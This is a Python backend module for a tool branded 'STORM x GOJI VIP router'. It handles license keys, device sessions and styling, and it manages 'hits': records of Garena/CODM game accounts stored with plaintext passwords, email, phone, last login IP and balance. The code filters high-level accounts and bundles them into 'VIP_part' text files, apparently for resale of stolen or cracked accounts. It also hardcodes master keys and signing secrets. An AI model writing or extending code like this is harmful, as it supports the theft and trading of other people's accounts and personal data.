#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""STORM x GOJI shared — keys, VIP hits, portable keys, sessions."""
from __future__ import annotations
import hashlib, json, os, threading
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

BASE = Path(__file__).resolve().parent
_DATA_ENV = (os.environ.get("DATA_DIR") or os.environ.get("RENDER_DISK_PATH") or "").strip()
DATA = Path(_DATA_ENV) if _DATA_ENV else (BASE / "router_data")
try:
    DATA.mkdir(parents=True, exist_ok=True)
except Exception:
    DATA = BASE / "router_data"
    DATA.mkdir(parents=True, exist_ok=True)

VIP_DIR = DATA / "vip_hits"
try:
    VIP_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    pass

KEYS_DB = DATA / "keys.json"
EVENTS = DATA / "events.jsonl"
ADMIN_CFG = DATA / "admin.json"
HITS_DB = DATA / "hits.jsonl"

MASTER_STORM = "STORM-POGI-LIFE"
MASTER_GOJI = "GOJI-POGI-LIFE"
KEY_PREFIX = "GOJI-STORM-"
_KEY_SIGN_SECRET = "STORM-GOJI-ROUTER-v4-OFX-2019"
ROUTER_API_SECRET = os.environ.get("ROUTER_API_SECRET", "STORM-GOJI-HOOK-SECRET-OFX")

_lock = threading.RLock()
_hit_lock = threading.RLock()


def now() -> datetime:
    return datetime.utcnow()


def iso(dt: Optional[datetime]) -> Optional[str]:
    if dt is None:
        return None
    try:
        return dt.isoformat(timespec="seconds") + "Z"
    except Exception:
        return None


def parse_iso(s: Optional[str]) -> Optional[datetime]:
    if not s:
        return None
    try:
        return datetime.fromisoformat(str(s).rstrip("Z"))
    except Exception:
        return None


def esc(s: Any) -> str:
    return (
        str(s if s is not None else "")
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def hash_pw(pw: str) -> str:
    return hashlib.sha256(("sg|" + str(pw)).encode("utf-8", errors="ignore")).hexdigest()


def ensure_admin() -> None:
    try:
        if not ADMIN_CFG.exists():
            ADMIN_CFG.write_text(
                json.dumps({"password_hash": hash_pw(MASTER_GOJI), "updated_at": iso(now())}, indent=2),
                encoding="utf-8",
            )
    except Exception:
        pass


def load_db() -> Dict[str, Any]:
    if not KEYS_DB.exists():
        return {"keys": {}, "banned_devices": [], "revoked": []}
    try:
        with _lock:
            data = json.loads(KEYS_DB.read_text(encoding="utf-8"))
        if not isinstance(data, dict):
            return {"keys": {}, "banned_devices": [], "revoked": []}
        data.setdefault("keys", {})
        data.setdefault("banned_devices", [])
        data.setdefault("revoked", [])
        if not isinstance(data["keys"], dict):
            data["keys"] = {}
        return data
    except Exception:
        return {"keys": {}, "banned_devices": [], "revoked": []}


def save_db(db: Dict[str, Any]) -> None:
    try:
        with _lock:
            DATA.mkdir(parents=True, exist_ok=True)
            tmp = KEYS_DB.with_suffix(".tmp")
            tmp.write_text(json.dumps(db, indent=2, ensure_ascii=False), encoding="utf-8")
            tmp.replace(KEYS_DB)
    except Exception:
        try:
            KEYS_DB.write_text(json.dumps(db, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass


def log_event(kind: str, detail: dict) -> None:
    row = {"ts": iso(now()), "kind": kind}
    if isinstance(detail, dict):
        row.update(detail)
    try:
        with _lock:
            with open(EVENTS, "a", encoding="utf-8") as f:
                f.write(json.dumps(row, ensure_ascii=False) + "\n")
    except Exception:
        pass


def read_events(limit: int = 100) -> List[dict]:
    if not EVENTS.exists():
        return []
    try:
        lines = EVENTS.read_text(encoding="utf-8", errors="ignore").splitlines()
        out: List[dict] = []
        for line in reversed(lines):
            line = line.strip()
            if not line:
                continue
            try:
                out.append(json.loads(line))
            except Exception:
                continue
            if len(out) >= limit:
                break
        return out
    except Exception:
        return []


def b32_encode(data: bytes) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    bits = value = 0
    out = []
    for b in data:
        value = (value << 8) | b
        bits += 8
        while bits >= 5:
            bits -= 5
            out.append(alphabet[(value >> bits) & 31])
    if bits:
        out.append(alphabet[(value << (5 - bits)) & 31])
    return "".join(out)


def sign_payload(payload: str) -> str:
    return hashlib.sha256((_KEY_SIGN_SECRET + "|" + payload).encode("utf-8")).hexdigest()[:8].upper()


def make_portable_key(expires_at: Optional[str]) -> str:
    unix = 0
    if expires_at:
        try:
            unix = int(datetime.fromisoformat(str(expires_at).rstrip("Z")).timestamp())
        except Exception:
            unix = 0
    exp_code = b32_encode(unix.to_bytes(4, "big")).ljust(7, "A")[:7]
    sig = sign_payload(f"P|{unix}|399")[:4]
    body = f"P{exp_code}{sig}"
    chunks = [body[i : i + 4] for i in range(0, len(body), 4)]
    return KEY_PREFIX + "-".join(chunks)


def parse_duration(unit: str, amount: int) -> Optional[str]:
    unit = (unit or "").strip().lower()
    if unit in ("lifetime", "life", "0", "none", ""):
        return None
    try:
        amount = int(amount)
    except Exception:
        amount = 1
    if amount <= 0:
        return None
    n = now()
    table = {
        "m": "minutes", "min": "minutes", "minute": "minutes", "minutes": "minutes",
        "h": "hours", "hr": "hours", "hour": "hours", "hours": "hours",
        "d": "days", "day": "days", "days": "days",
        "w": "weeks", "week": "weeks", "weeks": "weeks",
        "mo": "months", "month": "months", "months": "months",
        "y": "years", "year": "years", "years": "years",
    }
    kind = table.get(unit)
    if not kind:
        return None
    if kind == "minutes":
        d = timedelta(minutes=amount)
    elif kind == "hours":
        d = timedelta(hours=amount)
    elif kind == "days":
        d = timedelta(days=amount)
    elif kind == "weeks":
        d = timedelta(weeks=amount)
    elif kind == "months":
        d = timedelta(days=amount * 30)
    else:
        d = timedelta(days=amount * 365)
    return iso(n + d)


def append_hit(payload: dict) -> None:
    if not isinstance(payload, dict):
        return
    payload = dict(payload)
    payload.setdefault("hooked_at", iso(now()))
    try:
        with _hit_lock:
            DATA.mkdir(parents=True, exist_ok=True)
            with open(HITS_DB, "a", encoding="utf-8") as f:
                f.write(json.dumps(payload, ensure_ascii=False) + "\n")
    except Exception:
        pass
    try:
        log_event("vip_hook", {
            "account": str(payload.get("account") or "")[:32],
            "level": payload.get("codm_level"),
            "uid": payload.get("uid"),
            "hook_source": payload.get("hook_source"),
        })
    except Exception:
        pass


def load_hits(min_level: int = 400, max_level: int = 450) -> List[dict]:
    if not HITS_DB.exists():
        return []
    out: List[dict] = []
    seen = set()
    try:
        with _hit_lock:
            lines = HITS_DB.read_text(encoding="utf-8", errors="ignore").splitlines()
    except Exception:
        return []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except Exception:
            continue
        if not isinstance(row, dict):
            continue
        try:
            lvl = int(row.get("codm_level") or 0)
        except Exception:
            continue
        if lvl < min_level or lvl > max_level:
            continue
        key = (str(row.get("account") or ""), str(row.get("uid") or ""), lvl)
        if key in seen:
            continue
        seen.add(key)
        out.append(row)
    try:
        out.sort(key=lambda r: int(r.get("codm_level") or 0), reverse=True)
    except Exception:
        pass
    return out


def format_hit_block(h: dict) -> str:
    def g(*keys, default="N/A"):
        for k in keys:
            v = h.get(k)
            if v is not None and str(v).strip() != "":
                return v
        return default
    lines = [
        "-" * 60,
        f"Account: {g('account')} : {g('password')}",
        f"UID: {g('uid')}",
        f"Username: {g('username')}",
        f"Nickname: {g('nickname')}",
        f"Garena Shell: {g('shell_balance', default=0)}",
        f"Email: {g('email', 'email_display')}",
        f"Mobile: {g('mobile', 'formatted_mobile')}",
        f"Country: {g('country')}",
        "",
        "--- CODM Information ---",
        f"Account Level: {g('codm_level')}",
        f"Server: {g('codm_region')}",
        f"IGN: {g('codm_nickname')}",
        f"CODM UID: {g('codm_uid', 'uid')}",
        "",
        "--- Login History ---",
        f"Last Login: {g('last_login', 'last_login_date')}",
        f"Last Login IP: {g('last_login_ip')}",
        f"Last Login Country: {g('last_login_country')}",
        "",
        f"Clean: {h.get('is_clean', False)}",
        f"Hooked: {g('hooked_at')}",
        f"Source: {g('hook_source', default='unknown')}",
        "✦  STORM × GOJI  VIP ROUTER  ✦",
        "-" * 60,
    ]
    return "\n".join(str(x) for x in lines)


def build_vip_parts(hits: List[dict], per_file: int = 50) -> List[Tuple[str, str]]:
    if not hits:
        return []
    try:
        per_file = max(1, int(per_file))
    except Exception:
        per_file = 50
    parts: List[Tuple[str, str]] = []
    for i in range(0, len(hits), per_file):
        chunk = hits[i : i + per_file]
        body = "\n\n".join(format_hit_block(h) for h in chunk)
        n = (i // per_file) + 1
        parts.append((f"VIP_part-{n}.txt", body + "\n"))
    return parts


def touch_session(key: str, device_id: str) -> None:
    if not key:
        return
    db = load_db()
    rec = db.get("keys", {}).get(key)
    if not isinstance(rec, dict):
        return
    devices = rec.get("devices")
    if not isinstance(devices, list):
        devices = []
    now_s = iso(now())
    found = False
    for d in devices:
        if isinstance(d, dict) and d.get("id") == device_id:
            d["last_seen"] = now_s
            found = True
            break
    if not found and device_id:
        devices.append({"id": device_id, "last_seen": now_s})
    max_hist = int(rec.get("max_devices") or 3) + 5
    if len(devices) > max_hist:
        devices = devices[-max_hist:]
    rec["devices"] = devices
    rec["last_seen"] = now_s
    if device_id:
        rec["device_id"] = device_id
    db.setdefault("keys", {})[key] = rec
    save_db(db)


def session_status(rec: dict, idle_minutes: int = 15) -> str:
    if not isinstance(rec, dict):
        return "offline"
    if rec.get("banned"):
        return "banned"
    ls = parse_iso(rec.get("last_seen"))
    if not ls:
        return "offline"
    try:
        delta = (now() - ls).total_seconds()
    except Exception:
        return "offline"
    if delta <= idle_minutes * 60:
        return "active"
    if delta <= 24 * 3600:
        return "idle"
    return "offline"


CSS = """
:root{--bg:#07060c;--card:#12101c;--line:#2a2440;--cyan:#00e5ff;--mg:#ff2d95;--text:#f2f0ff;--muted:#9a94b0;--ok:#3dff9a;--bad:#ff4d6d;--warn:#ffc14d}
*{box-sizing:border-box}body{margin:0;font-family:ui-sans-serif,system-ui,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 10% -10%,#1a1030 0%,var(--bg) 45%);color:var(--text);min-height:100vh}
a{color:var(--cyan);text-decoration:none}
.nav{display:flex;gap:.85rem;flex-wrap:wrap;align-items:center;padding:1rem 1.25rem;border-bottom:1px solid var(--line);background:rgba(10,8,18,.92);position:sticky;top:0;z-index:10}
.nav .brand{font-weight:800;letter-spacing:.08em;background:linear-gradient(90deg,var(--cyan),var(--mg));-webkit-background-clip:text;color:transparent}
.nav a{color:var(--muted);font-size:.88rem;padding:.2rem .35rem}.nav a:hover,.nav a.active{color:var(--text)}
.wrap{max-width:1100px;margin:0 auto;padding:1.2rem}
h1{font-size:1.4rem;margin:0 0 .9rem}h2{font-size:1rem;margin:0 0 .7rem;color:var(--muted)}
.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1rem 1.15rem;margin-bottom:1rem}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:.75rem}
.stat{background:linear-gradient(145deg,#161225,#0e0c16);border:1px solid var(--line);border-radius:12px;padding:.85rem}
.stat b{display:block;font-size:1.4rem;color:var(--cyan)}.stat span{color:var(--muted);font-size:.76rem}
.btn,.btn-mg,.btn-bad{display:inline-block;border:0;border-radius:10px;padding:.48rem .85rem;font-weight:700;cursor:pointer;font-size:.8rem;margin:.12rem}
.btn{background:linear-gradient(90deg,var(--cyan),#6af);color:#041018}
.btn-mg{background:linear-gradient(90deg,var(--mg),#ff7ab8);color:#1a0410}
.btn-bad{background:var(--bad);color:#1a0408}
input,select{width:100%;background:#0b0a12;border:1px solid var(--line);color:var(--text);border-radius:10px;padding:.55rem .7rem;margin:.28rem 0 .65rem}
label{font-size:.76rem;color:var(--muted)}
table{width:100%;border-collapse:collapse;font-size:.8rem}
th,td{padding:.48rem .32rem;border-bottom:1px solid var(--line);text-align:left;vertical-align:middle}
th{color:var(--muted)}.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.76rem;word-break:break-all}
.tag{display:inline-block;padding:.1rem .38rem;border-radius:999px;font-size:.66rem;background:#1e1830;color:var(--cyan);border:1px solid var(--line)}
.tag.ok{color:var(--ok)}.tag.bad{color:var(--bad)}.tag.warn{color:var(--warn)}
.flash{padding:.6rem .85rem;border-radius:10px;margin-bottom:.85rem}
.flash.ok{background:rgba(61,255,154,.1);border:1px solid rgba(61,255,154,.3)}
.flash.bad{background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.3)}
.hint{color:var(--muted);font-size:.76rem}.table-wrap{overflow:auto}
.actions{display:flex;flex-wrap:wrap;gap:.3rem;align-items:center}
footer{text-align:center;color:var(--muted);font-size:.7rem;padding:1.4rem 1rem}
.live-dot{width:8px;height:8px;border-radius:50%;background:var(--ok);display:inline-block;margin-right:6px;box-shadow:0 0 8px var(--ok);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
"""
